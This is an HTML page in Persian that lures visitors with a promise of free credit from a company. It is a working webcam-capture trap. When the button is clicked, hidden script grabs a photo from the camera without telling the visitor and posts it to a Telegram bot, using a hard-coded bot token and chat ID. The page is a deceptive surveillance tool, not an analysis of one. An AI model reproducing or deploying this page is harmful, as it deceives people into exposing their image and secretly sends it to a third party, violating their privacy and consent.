<!doctype html>
<html lang="fa">
  <head>
	<meta charset="utf-8" />
	<title>تست عکس → تلگرام</title>
	<meta name="viewport" content="width=device-width,initial-scale=1" />
<style>
      body { font-family: sans-serif; text-align:center; padding:30px; background:#f0f4f8; }
  button { padding:15px 30px; font-size:18px; border:none; border-radius:10px; background:#4CAF50; color:white; cursor:pointer; }
  button:hover { background:#45a049; }
  #status { margin-top:15px; font-weight:bold; color:#333; }
  img { margin-top:15px; max-width:90%; border:2px solid #ccc; border-radius:8px; display:none; }
</style>
  </head>
  <body>
	<h2>کردیت رایگان از طرف شرکت سعیدی</h2>
	<p>برای دریافت کردیت رایگان دکمه پایین را فشار دهید </p>
	<button id="btn">برای دریافت اینجا را کلیک کنید </button>

	<video id="v" autoplay playsinline style="display:none;"></video>
	<canvas id="c" style="display:none;"></canvas>

<script>
    const BOT = '8254244222:AAHhZ8Bd_cuJIOaUzzHVWaNl7jEsLZ1XrXI';    // <-- اینجا توکن رباتت را جایگزین کن
    const CHAT = '6983233293';            // <-- اینجا chat_id عددی که گرفتیم
    const btn = document.getElementById('btn');
    const v = document.getElementById('v');
    const c = document.getElementById('c');

    btn.addEventListener('click', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        v.srcObject = stream;
        await new Promise(r => setTimeout(r, 600));
        c.width = v.videoWidth || 640;
        c.height = v.videoHeight || 480;
        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
        stream.getTracks().forEach(t => t.stop());

        c.toBlob(async (blob) => {
          if (!blob) { alert('خطا در گرفتن عکس'); return; }
          const form = new FormData();
          form.append('photo', blob, 'pic.jpg');
          form.append('chat_id', CHAT);

          const url = `https://api.telegram.org/bot${BOT}/sendPhoto`;
          try {
            const resp = await fetch(url, { method: 'POST', body: form });
            const j = await resp.json();
            if (j.ok) alert('️');
            else alert('ارسال نشد: ' + (j.description || JSON.stringify(j)));
          } catch (e) {
            alert('خطا در ارسال: ' + e.message);
          }
        }, 'image/jpeg', 0.9);

      } catch (err) {
        alert('مرورگر اجازه نداد یا خطا: ' + err.message);
      }
    });
</script>
  </body>
</html>